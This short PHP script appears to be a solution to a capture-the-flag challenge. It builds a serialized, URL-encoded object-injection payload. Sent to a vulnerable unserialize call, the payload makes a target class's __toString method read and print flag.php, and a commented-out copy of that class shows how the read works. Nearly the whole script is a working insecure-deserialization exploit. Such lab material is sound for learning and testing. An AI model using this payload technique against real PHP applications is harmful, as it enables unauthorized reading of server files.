<?php  

// class Flag{  //flag.php  
//     public $file;  
//     public function __tostring(){  
//         if(isset($this->file)){  
//             echo file_get_contents($this->file); 
//             echo "<br>";
//         return ("U R SO CLOSE !///COME ON PLZ");
//         }  
//     }  
// }  
class Flag{  
    public $file;  
    public function __construct(){  
        $this->file = "flag.php";  
    }
}
$file=new Flag();
$flag=serialize($file);
$flag1=urlencode($flag);
echo $flag1;
?>  
